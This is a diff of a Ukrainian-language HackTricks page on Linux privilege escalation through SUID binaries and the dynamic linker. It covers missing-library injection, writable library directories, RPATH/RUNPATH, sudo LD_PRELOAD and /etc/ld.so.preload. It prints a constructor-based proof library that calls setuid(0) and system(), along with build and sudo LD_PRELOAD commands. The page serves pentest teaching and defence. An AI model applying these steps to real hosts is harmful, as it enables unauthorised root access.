@@ -1,159 +1,200 @@
-# Зловживання SUID Shared Library і Linker
+# Зловживання спільними бібліотеками та компонувальником SUID
 
 {{#include ../../banners/hacktricks-training.md}}
 
-SUID-бінарні файли зазвичай перевіряють на можливість прямого виконання команд, але кастомні SUID-програми також можуть бути вразливими через dynamic linker. Загальна тема проста: привілейований виконуваний файл завантажує код із шляху або конфігурації, на які користувач із нижчими привілеями може впливати.<sup>[[1]](#references)</sup>
+Зазвичай SUID-бінарні файли перевіряють на можливість безпосереднього виконання команд, але власні SUID-програми також можуть бути вразливими через динамічний компонувальник. Загальна ідея проста: привілейований виконуваний файл завантажує код із шляху або конфігурації, на які може впливати користувач із нижчими привілеями.<sup>[[1]](#references)</sup>
 
-Ця сторінка зосереджена на загальних шаблонах технік: відсутні бібліотеки, каталоги бібліотек із правом запису, `RPATH`/`RUNPATH`, `LD_PRELOAD` через sudo, конфігурація linker і плутанина із SUID hardlink.
+На цій сторінці розглядаються загальні шаблони технік: відсутні бібліотеки, каталоги бібліотек із правом на запис, `RPATH`/`RUNPATH`, `LD_PRELOAD` через sudo, конфігурація компонувальника та плутанина з жорсткими посиланнями SUID.
 
-## Швидкий Enumeration
+Інформацію про заголовки програм ELF, динамічну секцію та поведінку завантажувача, на яких ґрунтуються ці перевірки, див. у розділі [Основна інформація про ELF](../../binary-exploitation/basic-stack-binary-exploitation-methodology/elf-tricks.md).
 
-Почніть із пошуку незвичних SUID-файлів і перевірте, чи є вони динамічно скомпонованими:<sup>[[1]](#references)[[3]](#references)</sup>
+## Швидкий пошук
+
+Спершу знайдіть незвичні SUID-файли та перевірте, чи пов’язані вони динамічно:<sup>[[1]](#references)[[3]](#references)</sup>
+
 ```bash
 find / -perm -4000 -type f -ls 2>/dev/null
 file /path/to/suid-binary
-ldd /path/to/suid-binary 2>/dev/null
 readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
 ```
-Зосередьтеся на нестандартних розташуваннях, шляхах користувацьких застосунків, бінарних файлах, власником яких є root, але які розташовані поза каталогами, керованими пакетним менеджером, і залежностях, що завантажуються із каталогів, доступних для запису.<sup>[[1]](#references)</sup>
+
+Для незнайомого виконуваного файла використовуйте `readelf`: [`ldd` може виконати неперевірений ELF-інтерпретатор](https://man7.org/linux/man-pages/man1/ldd.1.html). `readelf` показує прямі залежності, тому окремо перевірте, який саме шлях вибирає завантажувач.<sup>[[1]](#references)[[3]](#references)</sup>
+
+Звертайте увагу на нестандартні розташування, власні шляхи застосунків, бінарні файли, що належать root, але розташовані поза каталогами, якими керують пакунки, а також на залежності, завантажені з каталогів, доступних для запису.<sup>[[1]](#references)</sup>
 
 Корисні перевірки доступності для запису:
+
 ```bash
-ldd /path/to/suid-binary 2>/dev/null
 readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
 find / -writable -type d 2>/dev/null | head -n 50
 ```
+
 ## Missing Shared Object Injection
 
-Деякі custom SUID-бінарники намагаються завантажити shared object, якого не існує. Якщо відсутній шлях розташований у директорії, контрольованій attacker, бінарник може завантажити код, наданий attacker, із правами effective user.<sup>[[1]](#references)</sup>
+Деякі спеціальні SUID-бінарні файли намагаються завантажити спільну бібліотеку, якої не існує. Якщо відсутній шлях розташований у каталозі, контрольованому атакувальником, бінарний файл може завантажити код, наданий атакувальником, від імені ефективного користувача.<sup>[[1]](#references)</sup>
 
-Знаходьте невдалі пошуки library за допомогою syscall filter у `strace`:<sup>[[2]](#references)</sup>
+Те саме стосується **спеціального бінарного файлу, якому дозволено запускатися через sudo**, якщо він викликає `dlopen()` для абсолютного шляху `.so` у домашньому каталозі або каталозі конфігурації, доступному для запису користувачу, який його викликає. Таке пізнє завантаження бібліотеки може не відображатися у виводі `ldd` і записах ELF `NEEDED`. Перевірка виводу `strings` в обмеженому обсязі або трасування **непривілейованого** запуску може виявити шлях, до якого здійснюється спроба звернення; пошук може залежати від пароля застосунку або вибору в меню. Перш ніж вважати це підвищенням привілеїв, перевірте точне правило sudo, сам шлях і права доступу до батьківського каталогу, а також те, що привілейований запуск доходить до цього пошуку. Не запускайте ціль sudo лише для її переліку.
+
+Знаходьте невдалі спроби завантаження бібліотек за допомогою фільтра системних викликів `strace`:<sup>[[2]](#references)</sup>
+
 ```bash
 strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
 ```
-Якщо binary шукає `libexample.so` у доступному для запису шляху, мінімальна proof-бібліотека може використовувати constructor. Під час перевірки зберігайте proof-of-impact нешкідливим:<sup>[[6]](#references)</sup>
+
+Якщо бінарний файл шукає `libexample.so` у шляху, доступному для запису, мінімальна бібліотека для підтвердження може використовувати конструктор. Під час перевірки підтверджуйте вплив безпечним способом:<sup>[[6]](#references)</sup>
+
 ```c
 #include <stdlib.h>
 #include <unistd.h>
 
 __attribute__((constructor))
 static void init(void) {
-setuid(0);
-setgid(0);
-system("id > /tmp/suid-so-ran");
+    setuid(0);
+    setgid(0);
+    system("id > /tmp/suid-so-ran");
 }
 ```
-Зберіть його з точною назвою файлу, який намагається завантажити бінарний файл:
+
+Зберіть його з точною назвою файлу, яку намагається завантажити бінарний файл:
+
 ```bash
 gcc -shared -fPIC proof.c -o /writable/path/libexample.so
 /path/to/suid-binary
 cat /tmp/suid-so-ran
 ```
-Експлуатованою умовою є не лише відсутність library. Атакувальник також повинен мати можливість розмістити сумісний shared object за шляхом, який прийме привілейований loader.<sup>[[1]](#references)</sup>
 
-## Доступний для запису каталог library
+Експлуатована умова полягає не лише у відсутності бібліотеки. Зловмисник має мати змогу розмістити сумісний shared object за шляхом, який прийме привілейований loader.<sup>[[1]](#references)</sup>
 
-Іноді всі залежності існують, але один із каталогів, що використовуються для їх пошуку, доступний для запису. Це може дозволити замінити завантажену library або розмістити library з вищим пріоритетом із таким самим іменем.<sup>[[1]](#references)</sup>
+## Каталог бібліотек із правом запису
 
-Перевірте шляхи залежностей:<sup>[[1]](#references)[[3]](#references)</sup>
+Іноді всі залежності наявні, але один із каталогів, що використовуються для їх пошуку, доступний для запису. Це може дозволити замінити завантажену бібліотеку або розмістити бібліотеку з такою самою назвою, якій надаватиметься вищий пріоритет.<sup>[[1]](#references)</sup>
+
+Так само слід перевірити власний ELF, **дозволений через sudo**, навіть якщо ELF не має біта SUID, а дозволений обліковий запис RunAs не є root. Порівняйте записи `DT_NEEDED` із шляхом до бібліотеки, який визначить loader; потім перевірте, чи може користувач, що викликає команду, записувати у цей файл або замінити його через батьківський каталог, доступний для запису й пошуку. Перевірте точне правило sudo RunAs, символічні посилання та ACL, політику loader і те, чи завантажує цільовий процес бібліотеку від імені привілейованішого облікового запису. Файл `.so`, доступний для запису, або сама назва залежності — це лише зачіпка; перевіряйте метадані, не запускаючи команду sudo.<sup>[[1]](#references)[[3]](#references)[[5]](#references)</sup>
+
+Перевірте шляхи до залежностей:<sup>[[1]](#references)[[3]](#references)</sup>
+
 ```bash
-ldd /path/to/suid-binary 2>/dev/null
 readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
 namei -om /path/to/library.so
 ```
-Якщо каталог доступний для запису, перевірте це безпечним для копіювання підходом у лабораторному середовищі. Заміна системних бібліотек на активному хості може залишити процеси, що запускаються одночасно, з несумісними версіями бібліотек.<sup>[[8]](#references)</sup>
 
-## RPATH and RUNPATH
+Якщо каталог доступний для запису, перевірте це в лабораторії безпечним способом, використовуючи копію. Заміна системних бібліотек на робочому хості може призвести до того, що процеси, які запускаються одночасно, отримають несумісні версії бібліотек.<sup>[[8]](#references)</sup>
 
-`RPATH` і `RUNPATH` — це записи dynamic-section, які вказують loader, де шукати бібліотеки. Вони небезпечні в SUID-програмах, коли вказують на каталоги, доступні для запису атакувальнику.<sup>[[1]](#references)</sup>
+### Бібліотеки, доступні для запису всередині chroot
+
+Сам по собі chroot не закриває успадковані файлові дескриптори й не обмежує доступ до всієї файлової системи. Якщо пісочниця залишає файловий дескриптор каталогу, що вказує за межі нового кореневого каталогу, і ув'язнений процес може звертатися до нього (наприклад, через доступний запис `/proc/<pid>/fd/`), шляхи хоста можуть залишатися доступними. Це проблема меж файлової системи; сама по собі вона не надає привілеїв root.<sup>[[11]](#references)[[12]](#references)</sup>
+
+Окремо перевірте, чи може ув'язнений користувач записувати в каталог бібліотек, який використовуватиме **виконуваний файл хоста з SUID-бітом root**, запущений із в'язниці. Завантажувач шукає залежності у файловому представленні процесу, тому контрольована зловмисником бібліотека в цьому каталозі може виконуватися з ефективними правами SUID-програми. Перевірте точний виконуваний файл, його SUID-біт і політику монтування, ціль дескриптора та права доступу до неї, шлях пошуку бібліотек у в'язниці, а також те, чи може програма фактично отримати доступ до виконуваного файла хоста. Файлова capability у програми запуску пісочниці, доступна для запису в'язниця або двійковий файл хоста з SUID-бітом самі по собі є лише зачіпками; повний ланцюжок залежить від реалізації пісочниці.<sup>[[1]](#references)[[11]](#references)[[12]](#references)</sup>
+
+## RPATH і RUNPATH
+
+`RPATH` і `RUNPATH` — це записи секції dynamic, які вказують завантажувачу, де шукати бібліотеки. Вони становлять небезпеку в SUID-програмах, якщо вказують на каталоги, доступні для запису зловмиснику.<sup>[[1]](#references)</sup>
 
 Виявлення:<sup>[[3]](#references)[[10]](#references)</sup>
+
 ```bash
 readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
 objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
 ```
-Приклад небезпечного виводу:
+
+Приклад ризикованого виводу:
+
 ```text
 0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
 0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
 ```
-Якщо `/opt/app/lib` доступний для запису, а бінарний файл потребує `libcustom.so`, зловмисник може розмістити там шкідливий `libcustom.so`:<sup>[[1]](#references)</sup>
+
+Якщо каталог `/opt/app/lib` доступний для запису, а бінарному файлу потрібна бібліотека `libcustom.so`, зловмисник може розмістити там шкідливу `libcustom.so`:<sup>[[1]](#references)</sup>
+
 ```bash
 ls -ld /opt/app/lib
 gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
 /path/to/suid-binary
 ```
-`RPATH` і `RUNPATH` не є ідентичними щодо всіх деталей пошуку, але під час перевірки можливого підвищення привілеїв практичне питання залишається тим самим: чи шукає SUID-бінарний файл бібліотеку за її назвою в каталозі, доступному для запису атакувальнику?<sup>[[1]](#references)</sup>
+
+`RPATH` і `RUNPATH` не є ідентичними в усіх деталях пошуку, але під час перевірки на підвищення привілеїв практичне запитання однакове: чи шукає SUID-бінарний файл бібліотеку за її назвою в каталозі, доступному для запису зловмиснику?<sup>[[1]](#references)</sup>
 
 ## LD_PRELOAD, LD_LIBRARY_PATH і SUID
 
-Для звичайних програм `LD_PRELOAD` і `LD_LIBRARY_PATH` можуть примусово виконувати або впливати на завантаження shared object. Для SUID-програм dynamic loader зазвичай переходить у secure-execution mode та ігнорує небезпечні змінні середовища.<sup>[[1]](#references)</sup>
+Для звичайних програм `LD_PRELOAD` і `LD_LIBRARY_PATH` можуть примусово запускати або впливати на завантаження shared object. Для SUID-програм динамічний завантажувач зазвичай переходить у режим безпечного виконання та ігнорує небезпечні змінні середовища.<sup>[[1]](#references)</sup>
 
-Це означає, що звичайний SUID-бінарний файл зазвичай не є вразливим лише через те, що користувач може встановити `LD_PRELOAD`:<sup>[[1]](#references)</sup>
+Це означає, що звичайний SUID-бінарний файл зазвичай не є вразливим лише через те, що користувач може задати `LD_PRELOAD`:<sup>[[1]](#references)</sup>
+
 ```bash
 LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
 ```
-Поширеним винятком є політика sudo, яка дозволяє встановлювати або зберігати змінні завантажувача для цільової команди. Перевірте `sudo -l` на наявність таких записів, як `env_keep+=LD_PRELOAD` або `env_keep+=LD_LIBRARY_PATH`; якщо цільова програма динамічно скомпонована, вона може завантажити код, контрольований зловмисником:<sup>[[4]](#references)[[5]](#references)</sup>
+
+Поширений виняток — політика sudo, яка дозволяє задавати змінні середовища в командному рядку для цільової програми, наприклад за допомогою тегу `SETENV` або відповідного параметра `setenv`. Якщо цільова програма динамічно пов’язана, а sudo приймає `LD_PRELOAD=/path/to/library`, вона може завантажити контрольований викликачем код. Перевірте фактичне правило та ідентичність цільового користувача. Самого додавання `LD_PRELOAD` до `env_keep` недостатньо в системах, де динамічний завантажувач видаляє успадкований `LD_PRELOAD` до запуску процесу SUID `sudo`; присвоєння змінної в командному рядку обробляється sudo вже після власного запуску.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>
+
 ```bash
 sudo -l
-# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
+# Check SETENV/setenv and the target command's allowed arguments
 sudo LD_PRELOAD=/tmp/proof.so /allowed/command
 ```
-Не плутайте ці випадки; наведені вище правила loader і sudo policy розрізняють їх:<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>
 
-- `LD_PRELOAD` проти звичайного SUID binary: зазвичай блокується secure execution.
-- `LD_PRELOAD`, збережений sudo: потенційно exploitable.
-- Відсутній `.so` у writable path: exploitable, коли SUID binary природним чином завантажує цей path.
-- `RPATH`/`RUNPATH` до writable directory: exploitable, коли необхідною library можна керувати.
-- Доступ на запис до `/etc/ld.so.preload` або linker config: system-wide і має високий вплив.
+Не плутайте ці випадки: наведені вище правила для loader і sudo policy розрізняють їх:<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>
+
+- `LD_PRELOAD` для звичайного SUID binary: зазвичай блокується в secure execution.
+- `LD_PRELOAD`, переданий як аргумент командного рядка sudo для привілейованої динамічно зв’язаної цілі: потенційно вразливий.
+- Відсутній `.so` у доступному для запису шляху: вразливий, якщо SUID binary природно завантажує цей шлях.
+- `RPATH`/`RUNPATH`, що вказує на доступну для запису директорію: вразливий, якщо можна контролювати потрібну бібліотеку.
+- Доступ на запис до `/etc/ld.so.preload` або конфігурації linker: вплив на всю систему й високий рівень ризику.
 
 ## Конфігурація linker
 
-`ld.so` використовує linker cache і `/etc/ld.so.preload`; `ldconfig` створює цей cache з `/etc/ld.so.conf` і файлів, включених із нього, зазвичай із `/etc/ld.so.conf.d/`.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>
+`ld.so` використовує кеш linker і `/etc/ld.so.preload`; `ldconfig` створює цей кеш із `/etc/ld.so.conf` і файлів, включених до нього, зазвичай із `/etc/ld.so.conf.d/`.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>
 
 Перевірки з високою цінністю:
+
 ```bash
 ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
 find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
 find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
 ldconfig -v 2>/dev/null | head -n 50
 ```
-Writable linker configuration is usually more serious than a single vulnerable SUID binary because it can affect many dynamically linked processes. `/etc/ld.so.preload` is especially dangerous because it can force a shared object into privileged processes.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>
+
+Конфігурація лінкера, доступна для запису, зазвичай становить серйознішу загрозу, ніж один уразливий бінарний файл SUID, оскільки може впливати на багато динамічно скомпонованих процесів. `/etc/ld.so.preload` особливо небезпечний, бо може примусово завантажувати спільний об’єкт у привілейовані процеси.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>
 
 ## SUID Hardlink Confusion
 
-Hardlinks can make the same SUID inode appear under multiple names.<sup>[[9]](#references)</sup> Це корисно для приховування privileged helper, введення в оману під час очищення або обходу наївної перевірки на основі шляхів.
+Жорсткі посилання можуть змусити один і той самий inode SUID відображатися під кількома іменами.<sup>[[9]](#references)</sup> Це корисно для приховування привілейованого допоміжного засобу, ускладнення очищення або обходу наївної перевірки шляхів.
 
-Знайдіть SUID-файли, які мають більше одного link:<sup>[[9]](#references)</sup>
+Знайдіть файли SUID із кількома посиланнями:<sup>[[9]](#references)</sup>
+
 ```bash
 find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
 ```
+
 Перевірте всі шляхи до того самого inode:<sup>[[9]](#references)</sup>
+
 ```bash
 stat /path/to/suid-wrapper
 find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
 ```
-Зловживання полягає не в тому, що hardlink змінює дозволи. Зловживання полягає в плутанині шляхів: привілейований inode може бути доступний через ім’я, якого не очікують захисники або скрипти.<sup>[[9]](#references)</sup> Докладніше про inode та процес роботи з hardlink див. у розділі [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md).
+
+Зловживання полягає не в тому, що hardlink змінює дозволи. Зловживання полягає в плутанині зі шляхами: привілейований inode може бути доступний через ім’я, якого захисники чи скрипти не очікують.<sup>[[9]](#references)</sup> Докладніше про inode та робочий процес із hardlink див. у розділі [Файлова система, inode та відновлення](../main-system-information/filesystem-inodes-and-recovery.md).
 
 ## Захисні примітки
 
-- Зводьте кількість SUID-бінарних файлів до мінімуму, перевіряйте їх і, де можливо, керуйте ними через пакетний менеджер.
-- Уникайте записів `RPATH`/`RUNPATH`, що вказують на доступні для запису каталоги або каталоги, якими керують застосунки.<sup>[[1]](#references)[[8]](#references)</sup>
-- Власниками каталогів бібліотек мають бути root; звичайні користувачі не повинні мати до них доступу на запис.<sup>[[8]](#references)</sup>
-- Не зберігайте `LD_PRELOAD`, `LD_LIBRARY_PATH` або подібні змінні loader через sudo.<sup>[[1]](#references)[[5]](#references)</sup>
+- Зводьте кількість SUID-бінарних файлів до мінімуму, перевіряйте їх і, де можливо, керуйте ними за допомогою пакетного менеджера.
+- Уникайте записів `RPATH`/`RUNPATH`, що вказують на каталоги, доступні для запису або керовані програмами.<sup>[[1]](#references)[[8]](#references)</sup>
+- Каталоги бібліотек мають належати root і бути недоступними для запису звичайним користувачам.<sup>[[8]](#references)</sup>
+- Не зберігайте `LD_PRELOAD`, `LD_LIBRARY_PATH` та подібні змінні завантажувача під час запуску через sudo.<sup>[[1]](#references)[[5]](#references)</sup>
 - Відстежуйте `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` і неочікувані SUID-файли.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>
-- Перевіряйте SUID-файли з hardlink і досліджуйте спеціальні SUID-обгортки за межами стандартних системних шляхів.<sup>[[9]](#references)</sup>
+- Перевіряйте SUID-файли з кількома жорсткими посиланнями та розслідуйте випадки виявлення користувацьких SUID-обгорток поза стандартними системними шляхами.<sup>[[9]](#references)</sup>
 
 ## References
 
 - [1] [ld.so(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
 - [2] [strace(1) — сторінка посібника Linux](https://man7.org/linux/man-pages/man1/strace.1.html)
-- [3] [readelf (GNU Binary Utilities)](https://sourceware.org/binutils/docs/binutils/readelf.html)
+- [3] [readelf (утиліти GNU для роботи з бінарними файлами)](https://sourceware.org/binutils/docs/binutils/readelf.html)
 - [4] [sudo(8) — сторінка посібника Linux](https://www.man7.org/linux/man-pages/man8/sudo.8.html)
 - [5] [sudoers(5) — сторінка посібника Linux](https://man7.org/linux/man-pages/man5/sudoers.5.html)
-- [6] [Common Attributes (GCC)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
+- [6] [Поширені атрибути (GCC)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
 - [7] [ldconfig(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
-- [8] [Dynamic Linker Hardening (The GNU C Library)](https://www.sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
-- [9] [Hard Links (GNU Findutils)](https://www.gnu.org/software/findutils/manual/html_node/find_html/Hard-Links.html)
-- [10] [objdump (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/objdump.html)
+- [8] [Захист динамічного компонувальника (бібліотека GNU C)](https://www.sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
+- [9] [Жорсткі посилання (GNU Findutils)](https://www.gnu.org/software/findutils/manual/html_node/find_html/Hard-Links.html)
+- [10] [objdump (утиліти GNU для роботи з бінарними файлами)](https://www.sourceware.org/binutils/docs/binutils/objdump.html)
+- [11] [chroot(2) — сторінка посібника Linux](https://man7.org/linux/man-pages/man2/chroot.2.html)
+- [12] [proc_pid_fd(5) — сторінка посібника Linux](https://man7.org/linux/man-pages/man5/proc_pid_fd.5.html)
 {{#include ../../banners/hacktricks-training.md}}
